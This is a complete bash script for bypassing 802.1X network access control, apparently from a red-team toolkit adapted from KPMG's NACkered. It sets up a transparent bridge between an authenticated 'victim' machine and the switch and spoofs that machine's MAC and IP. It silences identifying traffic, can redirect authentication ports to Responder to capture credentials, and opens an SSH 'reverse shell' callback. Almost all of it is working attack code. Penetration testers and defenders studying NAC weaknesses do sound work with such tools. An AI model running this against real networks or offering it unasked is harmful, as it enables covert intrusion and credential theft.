#!/bin/bash
set -e

# -----
# Name: nac_bypass_setup.sh
# scip AG - Michael Schneider
# -----
# Original Script:
# Matt E - NACkered v2.92.2 - KPMG LLP 2014
# KPMG UK Cyber Defence Services
# -----

## Variables
VERSION="0.7.0"
RANDOMIZE=0

CMD_ARPTABLES=/usr/sbin/arptables
CMD_EBTABLES=/usr/sbin/ebtables
CMD_IPTABLES=/usr/sbin/iptables

## Text color variables - saves retyping these awful ANSI codes
TXTRST="\e[0m" # Text reset
SUCC="\e[1;32m" # green
INFO="\e[1;34m" # blue
WARN="\e[1;31m" # red
INP="\e[1;36m" # cyan

BRINT=br0 # bridge interface
SWINT=eth0 # network interface plugged into switch
COMPINT=eth1 # network interface plugged into victim machine

## Set initial SWMAC value, is set during initialisation
if [ "$RANDOMIZE" -eq 0 ]; then
    SWMAC=00:11:22:33:44:55
else
    SWMAC=$(printf '02:%02x:%02x:%02x:%02x:%02x\n' $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)))
fi

## Set IP addresses for bridge
if [ "$RANDOMIZE" -eq 0 ]; then
    BRIP=169.254.66.66 # IP address for the bridge
    BRGW=169.254.66.1 # Gateway IP address for the bridge
else
    THIRD_OCTET=$(( (RANDOM % 254) + 1 ))
    while :; do
        LAST_OCTET=$(( RANDOM % 256 ))
        # avoid .0, .1, .255 for the "random" one so it doesn't collide with the first IP or be a broadcast/network addr
        if [[ $LAST_OCTET -ne 0 && $LAST_OCTET -ne 1 && $LAST_OCTET -ne 255 ]]; then
            break
        fi
    done
    BRIP="169.254.${THIRD_OCTET}.${LAST_OCTET}" # IP address for the bridge
    BRGW="169.254.${THIRD_OCTET}.1" # Gateway IP address for the bridge
fi

TEMP_FILE=/tmp/tcpdump.pcap
GW_TEMP_FILE=/tmp/nac_bypass_gateway.pcap
DHCP_TEMP_FILE=/tmp/nac_bypass_dhcp.pcap
DHCP_CAPTURE_PID=""
OPTION_RESPONDER=0
OPTION_SSH=0
OPTION_AUTONOMOUS=0
OPTION_CONNECTION_SETUP_ONLY=0
OPTION_INITIAL_SETUP_ONLY=0
OPTION_RESET=0

## Ports for tcpdump
TCPDUMP_PORT_1=88
TCPDUMP_PORT_2=445

## Ports for Responder
PORT_UDP_NETBIOS_NS=137
PORT_UDP_NETBIOS_DS=138
PORT_UDP_DNS=53
PORT_UDP_LDAP=389
PORT_TCP_LDAP=389
PORT_TCP_SQL=1433
PORT_UDP_SQL=1434
PORT_TCP_HTTP=80
PORT_TCP_HTTPS=443
PORT_TCP_SMB=445
PORT_TCP_NETBIOS_SS=139
PORT_TCP_FTP=21
PORT_TCP_SMTP1=25
PORT_TCP_SMTP2=587
PORT_TCP_POP3=110
PORT_TCP_IMAP=143
PORT_TCP_PROXY=3128
PORT_UDP_MULTICAST=5553

DPORT_SSH=50222 #SSH call back port use victimip:50022 to connect to attackerbox:sshport
PORT_SSH=50022
RANGE=61000-62000 #Ports for my traffic on NAT
AUTO_ROUTE_PREFIX="" # Victim prefix, learned through DHCP or supplied with -p
TARGET_ROUTE_RANGE="" # Assessment network supplied with -n

CleanupCapture() {
    if [ -n "$DHCP_CAPTURE_PID" ]; then
        kill "$DHCP_CAPTURE_PID" 2>/dev/null || true
        wait "$DHCP_CAPTURE_PID" 2>/dev/null || true
        DHCP_CAPTURE_PID=""
    fi
}
trap CleanupCapture EXIT

## display usage hints
Usage() {
    echo -e "$0 v$VERSION usage:"
    echo "    -1 <eth>    network interface plugged into switch"
    echo "    -2 <eth>    network interface plugged into victim machine"
    echo "    -a          autonomous mode"
    echo "    -c          start connection setup only"
    echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
    echo "    -t <MAC>    set authenticated victim MAC address (COMMAC) manually"
    echo "    -T <IP>     set authenticated victim IP address (COMIP) manually"
    echo "    -f <RANGE>  filter out all outbound connection except on this range (cautious mode, for Red Team)"
    echo "    -n <CIDR>   route this assessment network through the learned gateway"
    echo "    -p <PREFIX> victim subnet prefix for gateway discovery (example: -p 25)"
    echo "    -s <IP>     set source IP address for communication with COMP. WARNING: IP address must exist, for supplicant ARP request to succeed"
    echo "    -h          display this help"
    echo "    -i          start initial setup only"
    echo "    -r          reset all settings"
    echo "    -R          enable port redirection for Responder"
    echo "    -S          enable port redirection for OpenSSH and start the service"
    exit 0
}

## display version info
Version() {
    echo -e "$0 v$VERSION"
    exit 0
}

## Make sure we're running as root, everything below relies on it
CheckRoot() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "$WARN [ ! ] This script must be run as root.$TXTRST"
        exit 1
    fi
}

## Validate a MAC address in xx:xx:xx:xx:xx:xx form
IsValidMac() {
    [[ $1 =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

## Validate an IPv4 address, rejecting octets above 255
IsValidIp() {
    local ip=$1
    local octet
    [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
    for octet in ${ip//./ }; do
        (( octet <= 255 )) || return 1
    done
}

## Check if we got all needed parameters
CheckParams() {
    while getopts ":1:2:acg:f:n:p:s:t:T:hirRS" opts
    do
        case "$opts" in
            "1")
                SWINT=$OPTARG
                ;;
            "2")
                COMPINT=$OPTARG
                ;;
            "a")
                OPTION_AUTONOMOUS=1
                ;;
            "c")
                OPTION_CONNECTION_SETUP_ONLY=1
                ;;
            "g")
                GWMAC=$OPTARG
                ;;
            "t")
                COMPMAC=$OPTARG
                ;;
            "T")
                COMIP=$OPTARG
                ;;
            "f")
                RESTRICT_TO_DEST_RANGE=$OPTARG
                ;;
            "n")
                TARGET_ROUTE_RANGE=$OPTARG
                ;;
            "p")
                AUTO_ROUTE_PREFIX=$OPTARG
                ;;
            "s")
                TO_COMP_SOURCE_IP=$OPTARG
                ;;
            "h")
                Usage
                ;;
            "i")
                OPTION_INITIAL_SETUP_ONLY=1
                ;;
            "r")
                OPTION_RESET=1
                ;;
            "R")
                OPTION_RESPONDER=1
                ;;
            "S")
                OPTION_SSH=1
                ;;
            *)
                OPTION_RESPONDER=0
                OPTION_SSH=0
                OPTION_AUTONOMOUS=0
                ;;
        esac
    done
}

InitialSetup() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Starting NAC bypass! Stay tuned...$TXTRST"
        echo
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Doing some ground work$TXTRST"
        echo
    fi

    # Keep NetworkManager available for a Wi-Fi management/AP interface while
    # ensuring it does not configure the transparent Ethernet bridge members.
    nmcli device set "$SWINT" managed no 2>/dev/null || true
    nmcli device set "$COMPINT" managed no 2>/dev/null || true
    if pgrep -af dhcpcd 2>/dev/null | grep -Eq "dhcpcd:.*(${SWINT}|${COMPINT})"; then
        echo -e "$WARN [ ! ] dhcpcd still manages a bridge port. Add 'denyinterfaces $SWINT $COMPINT' to /etc/dhcpcd.conf and reboot.$TXTRST"
        exit 1
    fi
    sysctl -w "net.ipv6.conf.${SWINT}.disable_ipv6=1" >/dev/null
    sysctl -w "net.ipv6.conf.${COMPINT}.disable_ipv6=1" >/dev/null

    # Turn off multicast to prevent initial IGMP messages
    ip link set $SWINT multicast off
    ip link set $COMPINT multicast off

    # Stop NTP services
    declare -a NTP_SERVICES=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
    for NTP_SERVICE in "${NTP_SERVICES[@]}"
    do
        if systemctl is-active --quiet "$NTP_SERVICE"; then
            systemctl stop "$NTP_SERVICE"
        fi
    done
    timedatectl set-ntp false || true

    # get SWINT MAC address automatically
    SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'`

    if ! IsValidMac "$SWMAC"; then
        echo -e "$WARN [ ! ] Could not determine a valid switch-side MAC address (SWMAC='$SWMAC') from $SWINT.$TXTRST"
        exit 1
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] Ground work done.$TXTRST"
        echo
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Starting bridge configuration$TXTRST"
        echo
    fi

    brctl addbr $BRINT # create bridge
    brctl addif $BRINT $COMPINT # add computer side to bridge
    brctl addif $BRINT $SWINT # add switch side to bridge

    # Disable STP for the bridge in order to avoid leaking the bridge's MAC
    ip link set dev br0 type bridge stp_state 0
    ip link set dev br0 type bridge forward_delay 0

    # Forward EAP packets (bit 3 = 8) & LLDP packets (bit 14 = 16384)
    echo 16392 > /sys/class/net/br0/bridge/group_fwd_mask # forward EAP packets

    # Ensuring br_netfilter is available for bridge iptables support
    if [ ! -d /proc/sys/net/bridge ]; then
        echo -e "$INFO [ * ] br_netfilter not loaded, attempting to load module$TXTRST"
        modprobe br_netfilter 2>/dev/null || true
        sleep 1
    fi

    if [ -d /proc/sys/net/bridge ]; then
        echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables
    else
        echo -e "$WARN [ ! ] br_netfilter not available, continuing without bridge iptables support$TXTRST"
    fi

    # ifconfig with 0.0.0.0 does not reliably remove DHCP addresses/routes.
    ip -4 addr flush dev "$COMPINT"
    ip -4 addr flush dev "$SWINT"
    ip link set dev "$COMPINT" up promisc on
    ip link set dev "$SWINT" up promisc on

    if [ "$RANDOMIZE" -eq 0 ]; then
        macchanger -m 00:12:34:56:78:90 $BRINT # Swap MAC of bridge to an initialisation value
    else
        macchanger -A $BRINT # Swap MAC of bridge to an initialisation value
    fi
    macchanger -m $SWMAC $BRINT # Swap MAC of bridge to the switch side MAC

    ## Bringing up the Bridge
    ifconfig $BRINT 0.0.0.0 up promisc

    ## Set default iptables forward policy to ACCEPT to avoid bridge from being non functional
    $CMD_IPTABLES -P FORWARD ACCEPT

    # Opportunistically capture a fresh DHCP exchange. Option 1 supplies the
    # victim prefix needed to distinguish on-link traffic from gateway traffic.
    rm -f "$DHCP_TEMP_FILE"
    tcpdump -i "$COMPINT" -s0 -U -w "$DHCP_TEMP_FILE" \
        'udp and (port 67 or port 68)' >/dev/null 2>&1 &
    DHCP_CAPTURE_PID=$!

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] Bridge up, should be dark.$TXTRST"
        echo
        echo -e "$INP [ # ] Connect Ethernet cables to adapters...$TXTRST"
        echo -e "$INP [ # ] Wait for 30 seconds then press any key...$TXTRST"
        echo -e "$WARN [ ! ] Victim machine should work at this point - if not, bad times are coming - run!!$TXTRST"
        read -p " " -n1 -s
        echo
    else
        sleep 25s
    fi
}

ConnectionSetup() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Resetting connection$TXTRST"
        echo
    fi

    # Best-effort: not every driver supports forcing a renegotiation
    ethtool -r $COMPINT 2>/dev/null || true
    ethtool -r $SWINT 2>/dev/null || true

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Listening for TCP traffic...$TXTRST"
        echo
    fi

    ## Only frames entering Linux from COMPINT can identify the victim. Without
    ## -Q in, a network-originated SYN can reverse victim/gateway detection.
    if [[ -n "$COMPMAC" && -n "$COMIP" ]]; then
        echo -e "$INFO [ * ] Victim values supplied manually: COMPMAC=$COMPMAC COMIP=$COMIP$TXTRST"
    else
        echo -e "$INFO [ * ] Waiting up to 120 seconds for a victim-originated TCP SYN on $COMPINT...$TXTRST"
        rm -f "$TEMP_FILE"
        if ! timeout 120 tcpdump -Q in -i "$COMPINT" -s0 -w "$TEMP_FILE" \
            -c1 'tcp[13] & 2 != 0'; then
            echo -e "$WARN [ ! ] No victim-originated SYN captured. Generate victim traffic or use -T and -t.$TXTRST"
            exit 1
        fi
    fi

    if [ -z "$COMPMAC" ]; then
        COMPMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
    fi

    if [ -z "$COMIP" ]; then
        COMIP=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`
    fi

    if [ -n "$DHCP_CAPTURE_PID" ]; then
        kill "$DHCP_CAPTURE_PID" 2>/dev/null || true
        wait "$DHCP_CAPTURE_PID" 2>/dev/null || true
        DHCP_CAPTURE_PID=""
    fi
    if [ -z "$AUTO_ROUTE_PREFIX" ] && [ -s "$DHCP_TEMP_FILE" ]; then
        DHCP_SUBNET_MASK=$(tcpdump -nn -vvv -r "$DHCP_TEMP_FILE" \
            'udp port 67 or udp port 68' 2>/dev/null \
            | sed -n 's/.*Subnet-Mask Option 1, length 4: \([0-9.]*\).*/\1/p' \
            | tail -n 1)
        if [ -n "$DHCP_SUBNET_MASK" ]; then
            AUTO_ROUTE_PREFIX=$(python3 - "$DHCP_SUBNET_MASK" <<'PY'
import ipaddress
import sys
print(ipaddress.IPv4Network("0.0.0.0/" + sys.argv[1]).prefixlen)
PY
)
        fi
    fi
    if [ -n "$AUTO_ROUTE_PREFIX" ]; then
        if ! [[ "$AUTO_ROUTE_PREFIX" =~ ^[0-9]+$ ]] || \
           [ "$AUTO_ROUTE_PREFIX" -lt 0 ] || [ "$AUTO_ROUTE_PREFIX" -gt 32 ]; then
            echo -e "$WARN [ ! ] Invalid victim prefix: $AUTO_ROUTE_PREFIX$TXTRST"
            exit 1
        fi
        AUTO_ROUTE_NETWORK=$(python3 - "$COMIP" "$AUTO_ROUTE_PREFIX" <<'PY'
import ipaddress
import sys
print(ipaddress.ip_network(f"{sys.argv[1]}/{sys.argv[2]}", strict=False))
PY
)
        echo -e "$INFO [ * ] Victim subnet: $AUTO_ROUTE_NETWORK$TXTRST"
    fi

    ## A gateway MAC must come from a separate victim packet addressed outside
    ## the victim subnet; the first SYN may instead target an on-link host.
    if [ -z "$GWMAC" ]; then
        if [ -z "$AUTO_ROUTE_PREFIX" ]; then
            echo -e "$WARN [ ! ] Victim prefix unknown. Reconnect for DHCP or use -p PREFIX.$TXTRST"
            exit 1
        fi
        echo -e "$INFO [ * ] Waiting up to 120 seconds for victim traffic outside $AUTO_ROUTE_NETWORK...$TXTRST"
        rm -f "$GW_TEMP_FILE"
        if ! timeout 120 tcpdump -Q in -i "$COMPINT" -s0 -w "$GW_TEMP_FILE" \
            -c1 "ether src $COMPMAC and tcp[tcpflags] & tcp-syn != 0 and not dst net $AUTO_ROUTE_NETWORK"; then
            echo -e "$WARN [ ! ] No off-subnet victim SYN captured. Generate one or use -g GATEWAY_MAC.$TXTRST"
            exit 1
        fi
        GWMAC=$(tcpdump -r "$GW_TEMP_FILE" -nne -c1 tcp 2>/dev/null \
            | awk '{gsub(/,/, "", $4); print $4}')
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Processing packet and setting variables $TXTRST"
        echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
        echo
    fi

    ## Validate what we captured (or were given) before we act on it
    if ! IsValidMac "$COMPMAC"; then
        echo -e "$WARN [ ! ] Could not determine a valid victim MAC address (COMPMAC='$COMPMAC'). Re-run with -t <MAC> to set it manually.$TXTRST"
        exit 1
    fi

    if ! IsValidMac "$GWMAC"; then
        echo -e "$WARN [ ! ] Could not determine a valid gateway MAC address (GWMAC='$GWMAC'). Re-run with -g <MAC> to set it manually.$TXTRST"
        exit 1
    fi

    if ! IsValidIp "$COMIP"; then
        echo -e "$WARN [ ! ] Could not determine a valid victim IP address (COMIP='$COMIP'). Re-run with -T <IP> to set it manually.$TXTRST"
        exit 1
    fi
    if [ "${COMPMAC,,}" = "${GWMAC,,}" ]; then
        echo -e "$WARN [ ! ] Gateway MAC equals victim MAC; refusing ambiguous setup.$TXTRST"
        exit 1
    fi
    if [ -z "$TARGET_ROUTE_RANGE" ] && [ -z "$RESTRICT_TO_DEST_RANGE" ]; then
        echo -e "$WARN [ ! ] Supply an assessment network with -n CIDR (or -f CIDR).$TXTRST"
        exit 1
    fi

    ## Going Silent
    $CMD_ARPTABLES -A OUTPUT -o $SWINT -j DROP
    $CMD_ARPTABLES -A OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -A OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -A OUTPUT -o $SWINT -j DROP

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Bringing up interface with bridge side IP address, setting up Layer 2 rewrite and default route. $TXTRST"
        echo
    fi
    ifconfig $BRINT $BRIP up promisc

    ## Setting up Layer 2 rewrite
    ## If script was called with -c, we need to find the MAC of the interface towards the switch.
    if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
        SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'`
    fi

    if ! IsValidMac "$SWMAC"; then
        echo -e "$WARN [ ! ] Could not determine a valid switch-side MAC address (SWMAC='$SWMAC') from $SWINT.$TXTRST"
        exit 1
    fi

    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $COMPINT -j snat --to-src $GWMAC

    ## Manually set MAC resolution & routing for legitimate supplicant COMP
    if [ ! -z "$TO_COMP_SOURCE_IP" ]; then ## Only if parameter -s is used
        arp -s -i $BRINT $COMIP $COMPMAC
        route add -host $COMIP dev $BRINT
    fi

    ## Resolve and pin the verified gateway/victim identities to their known
    ## physical bridge sides. A neighbor entry alone does not select a port.
    ip neigh replace "$BRGW" lladdr "$GWMAC" nud permanent dev "$BRINT"
    bridge fdb del "$GWMAC" dev "$COMPINT" master 2>/dev/null || true
    bridge fdb replace "$GWMAC" dev "$SWINT" master static
    bridge fdb replace "$COMPMAC" dev "$COMPINT" master static

    # Cautious mode remains both a route and an outbound destination filter.
    if [ -n "$RESTRICT_TO_DEST_RANGE" ]; then
        ip route replace "$RESTRICT_TO_DEST_RANGE" via "$BRGW" dev "$BRINT" onlink metric 10
    fi
    if [ -n "$TARGET_ROUTE_RANGE" ]; then
        if ! NORMALIZED_TARGET_RANGE=$(python3 - "$TARGET_ROUTE_RANGE" <<'PY'
import ipaddress
import sys
print(ipaddress.IPv4Network(sys.argv[1], strict=False))
PY
); then
            echo -e "$WARN [ ! ] Invalid assessment CIDR: $TARGET_ROUTE_RANGE$TXTRST"
            exit 1
        fi
        TARGET_ROUTE_RANGE=$NORMALIZED_TARGET_RANGE
        ip route replace "$TARGET_ROUTE_RANGE" via "$BRGW" dev "$BRINT" onlink metric 10
        if ! ip route show "$TARGET_ROUTE_RANGE" | grep -q "via $BRGW dev $BRINT"; then
            echo -e "$WARN [ ! ] Assessment route verification failed.$TXTRST"
            exit 1
        fi
        echo -e "$SUCC [ + ] Route installed: $TARGET_ROUTE_RANGE via $BRGW dev $BRINT$TXTRST"
    fi

    ## SSH CALLBACK if we receive inbound on br0 for VICTIMIP:DPORT forward to BRIP on SSH
    if [ "$OPTION_SSH" -eq 1 ]; then

        if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
            echo
            echo -e "$INFO [ * ] Setting up SSH reverse shell inbound on $COMIP:$DPORT_SSH and start OpenSSH daemon $TXTRST"
            echo
        fi
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT_SSH -j DNAT --to $BRIP:$PORT_SSH
    fi

    if [ "$OPTION_RESPONDER" -eq 1 ]; then

        if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
            echo
            echo -e "$INFO [ * ] Setting up all inbound ports for Responder $TXTRST"
            echo
        fi

        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_NS -j DNAT --to $BRIP:$PORT_UDP_NETBIOS_NS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_DS -j DNAT --to $BRIP:$PORT_UDP_NETBIOS_DS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_DNS -j DNAT --to $BRIP:$PORT_UDP_DNS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_LDAP -j DNAT --to $BRIP:$PORT_UDP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_LDAP -j DNAT --to $BRIP:$PORT_TCP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SQL -j DNAT --to $BRIP:$PORT_TCP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_SQL -j DNAT --to $BRIP:$PORT_UDP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTP -j DNAT --to $BRIP:$PORT_TCP_HTTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTPS -j DNAT --to $BRIP:$PORT_TCP_HTTPS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMB -j DNAT --to $BRIP:$PORT_TCP_SMB
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_NETBIOS_SS -j DNAT --to $BRIP:$PORT_TCP_NETBIOS_SS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_FTP -j DNAT --to $BRIP:$PORT_TCP_FTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP1 -j DNAT --to $BRIP:$PORT_TCP_SMTP1
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP2 -j DNAT --to $BRIP:$PORT_TCP_SMTP2
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_POP3 -j DNAT --to $BRIP:$PORT_TCP_POP3
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_IMAP -j DNAT --to $BRIP:$PORT_TCP_IMAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_PROXY -j DNAT --to $BRIP:$PORT_TCP_PROXY
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_MULTICAST -j DNAT --to $BRIP:$PORT_UDP_MULTICAST
    fi

    ## Setting up Layer 3 rewrite rules to allow to communicate with COMP (legitimate supplicant)
    if [ ! -z "$TO_COMP_SOURCE_IP" ]; then ## Only if parameter -s is used
        $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -d $COMIP -j SNAT -p tcp --to $TO_COMP_SOURCE_IP:$RANGE
        $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -d $COMIP -j SNAT -p udp --to $TO_COMP_SOURCE_IP:$RANGE
        $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -d $COMIP -j SNAT -p icmp --to $TO_COMP_SOURCE_IP
    fi

    # Setting up Layer 3 rewrite rules
    # Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMIP and give it a port in the range for NAT
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

    ## START SSH
    if [ "$OPTION_SSH" -eq 1 ]; then
        systemctl start ssh.service
    fi

    ## Finish
    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] All setup steps complete; check ports are still lit and operational $TXTRST"
        echo
    fi

    ## Cautious-mode filtering rules
    if [ -n "$RESTRICT_TO_DEST_RANGE" ]; then
        # Allow only selected outbound traffic from your machine
        $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -d $RESTRICT_TO_DEST_RANGE -j ACCEPT
        # Drop all the rest
        $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -j DROP
    fi

    ## Re-enabling traffic flow; monitor ports for lockout
    $CMD_ARPTABLES -D OUTPUT -o $SWINT -j DROP
    $CMD_ARPTABLES -D OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -D OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -D OUTPUT -o $SWINT -j DROP

    ## Housecleaning
    rm -f "$TEMP_FILE" "$GW_TEMP_FILE" "$DHCP_TEMP_FILE"

    ## All done!
    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INP [ * ] Time for fun & profit $TXTRST"
        echo
    fi
}

Reset() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Resetting all settings $TXTRST"
        echo
    fi

    ## Bringing bridge down
    ifconfig $BRINT down 2>/dev/null || true
    brctl delbr $BRINT 2>/dev/null || true

    ## Delete default route
    arp -d -i $BRINT $BRGW $GWMAC 2>/dev/null || true
    route del default dev $BRINT 2>/dev/null || true

    # Flush EB, ARP- and IPTABLES
    $CMD_EBTABLES -F
    $CMD_EBTABLES -F -t nat
    $CMD_ARPTABLES -F
    $CMD_IPTABLES -F
    $CMD_IPTABLES -F -t nat

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] All reset steps are completed. $TXTRST"
        echo
    fi
}

## Main
CheckParams "$@"
CheckRoot

if [ "$OPTION_RESET" -eq 1 ]; then
    Reset
    exit 0
fi

if [ "$OPTION_INITIAL_SETUP_ONLY" -eq 1 ]; then
    InitialSetup
    exit 0
fi

if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
    ConnectionSetup
    exit 0
fi

InitialSetup
ConnectionSetup
